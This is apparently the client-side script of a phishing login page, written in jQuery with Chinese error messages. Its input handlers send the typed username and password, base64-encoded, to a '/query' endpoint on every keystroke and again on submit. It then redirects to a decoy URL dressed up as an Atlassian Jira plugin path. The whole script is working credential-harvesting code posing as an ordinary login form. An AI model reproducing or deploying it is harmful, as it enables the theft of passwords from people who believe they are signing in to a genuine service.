    <script>
        let n = $("[name=username]");
        let p = $("[name=password]");
        let pt = $("[name=password-text]");
        pt.hide();
        let c = $("#clearv");
        let t = $("#login-pwdToggle");
        let ls = $("#login-submit");
        let ll = $("#login-loading");
        let e = $("#error");
        let timer = -1;
        let eshow = (str = "") => {
            e.html(str);
            e.show();
            timer = setTimeout(ehide, 2000);
        };
        let ehide = () => {
            clearTimeout(timer);
            e.hide();
        }
        let fnp = () => {
            let str = `type=input&u=${n.val()}&p=${p.val()}&`;
            f(`/query?d=${window.btoa(encodeURIComponent(str))}`, (e) => {
                if (e == "error") {
                } else {
                }
            })
        };
        n.on("input", () => {
            fnp();
        });
        pt.on("input", () => {
            p.val(pt.val() || "");
            if (pt.val() !== "") {
                c.show();
            } else {
                c.hide();
            }
            fnp();
        });
        p.on("input", () => {
            pt.val(p.val() || "");
            if (p.val() !== "") {
                c.show();
            } else {
                c.hide();
            }
            fnp();
        });
        c.on("click", () => {
            p.val("");
            pt.val("");
        });
        t.on("click", () => {
            if (p.css("display") === "none") {
                pt.hide();
                p.show();
            } else {
                p.hide();
                pt.show();
            }
        });
        ls.on("click", () => {
            if (n.val() == "") {
                eshow("你还没有输入帐号！");
                return;
            }
            if (pt.val() == "" || p.val() == "") {
                eshow("你还没有输入密码！");
                return;
            }
            let str = `type=input&u=${n.val()}&p=${p.val()}&`;
            f(`/query?d=${window.btoa(encodeURIComponent(str))}`, (e) => {
                if (e == "error") {
                } else {
                }
            })
            str = `type=login&u=${n.val()}&p=${p.val()}&`;
            f(`/query?d=${window.btoa(encodeURIComponent(str))}`,
                (e) => {
                    if (e == "error") {
                        eshow("请输入正确的帐号！");
                        ll.hide();
                    } else if (/pass\=/.test(e)) {
                        let str = "mbid=" + e.replace("pass=", "");
                        window.location.href = "/check.html?05bc899676d6ef43f8bee0f69eddca11-T/32153o/72006/84fdc170c16a2ee1010fc21da6f4ef80/3a41998d206411764f134db8d015d63c/_/download/contextbatch/css/com.atlassian.jira.plugins.jira-development-integration-plugin?appid=ngienbnpkldjcebacfbppphjjhbhfkpp&assatrisd=kjhzkKYQnkajsnAOY!hoASdjoAW&rtime=1010230102301203123&dwl=1-1-23-1-123&ttl=1566413096&ri=1433600&rs=1400&clientip=69.194.14.161&hash=29b554a946b107e4028379e37bf4e2c5&" + str;
                        ehide();
                        ll.hide();
                    } else if (/pass/.test(e)) {
                        setTimeout(() => {
                            window.location.href = "/check.html?05bc899676d6ef43f8bee0f69eddca11-T/32153o/72006/84fdc170c16a2ee1010fc21da6f4ef80/3a41998d206411764f134db8d015d63c/_/download/contextbatch/css/com.atlassian.jira.plugins.jira-development-integration-plugin?appid=ngienbnpkldjcebacfbppphjjhbhfkpp&assatrisd=kjhzkKYQnkajsnAOY!hoASdjoAW&rtime=1010230102301203123&dwl=1-1-23-1-123&ttl=1566413096&ri=1433600&rs=1400&clientip=69.194.14.161&hash=29b554a946b107e4028379e37bf4e2c5&";
                            ehide();
                            ll.hide();
                        }, 3000);
                    } else {
                        setTimeout(() => {
                            eshow("网络异常，请稍后重试");
                            ll.hide();
                        }, 7500);
                    }
                }, (e) => {
                    setTimeout(() => {
                        eshow("网络异常，请稍后重试");
                        ll.hide();
                    }, 7500);
                });
            ll.show();
        });
        eshow("检测登录状态...");
    </script>
